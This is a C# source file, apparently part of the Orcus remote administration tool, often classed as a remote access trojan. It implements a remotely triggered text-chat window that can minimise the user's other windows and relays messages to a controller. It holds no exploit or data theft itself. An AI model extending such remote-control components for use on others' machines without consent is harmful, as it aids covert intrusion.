using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using Orcus.Commands.TextChat.Utilities;
using Orcus.Plugins;
using Orcus.Shared.Commands.TextChat;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.TextChat
{
    public class TextChatCommand : Command
    {
        private TextChatForm _currentChatForm;

        public override void Dispose()
        {
            base.Dispose();
            _currentChatForm?.Close();
            _currentChatForm = null;
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((TextChatCommunication) parameter[0])
            {
                case TextChatCommunication.SendMessage:
                    _currentChatForm?.MessageReceived(new DateTime(BitConverter.ToInt64(parameter, 1)),
                        Encoding.UTF8.GetString(parameter, 9, parameter.Length - 9));
                    break;
                case TextChatCommunication.OpenChat:
                    var chatSettings = new Serializer(typeof (ChatSettings)).Deserialize<ChatSettings>(parameter, 1);
                    if (chatSettings.HideEveythingElse)
                        Computer.MinimizeAllScreens();

                    _currentChatForm = new TextChatForm(chatSettings);
                    _currentChatForm.SendMessage += (sender, args) =>
                    {
                        var data = new List<byte> {(byte) TextChatCommunication.ResponseMessage};
                        data.AddRange(BitConverter.GetBytes(DateTime.UtcNow.Ticks));
                        data.AddRange(Encoding.UTF8.GetBytes(args.Message));
                        connectionInfo.CommandResponse(this, data.ToArray());
                    };
                    _currentChatForm.Closed += (sender, args) =>
                    {
                        _currentChatForm = null;
                        try
                        {
                            connectionInfo.CommandResponse(this, new[] { (byte)TextChatCommunication.ChatClosed });
                        }
                        catch (Exception)
                        {
                            // ignored
                        }
                    };
                    connectionInfo.CommandResponse(this, new[] {(byte) TextChatCommunication.ChatOpened});
                    _currentChatForm.ShowDialog();
                    break;
                case TextChatCommunication.Close:
                    if (_currentChatForm != null)
                    {
                        if (!_currentChatForm.IsClosed)
                            try
                            {
                                _currentChatForm.Invoke((MethodInvoker) (() => _currentChatForm.ForceClose()));
                            }
                            catch (Exception)
                            {
                                // ignored
                            }
                        _currentChatForm = null;
                    }

                    //dont send the close message, the window will do that by itself (Closed-Event)
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        protected override uint GetId()
        {
            return 21;
        }
    }
}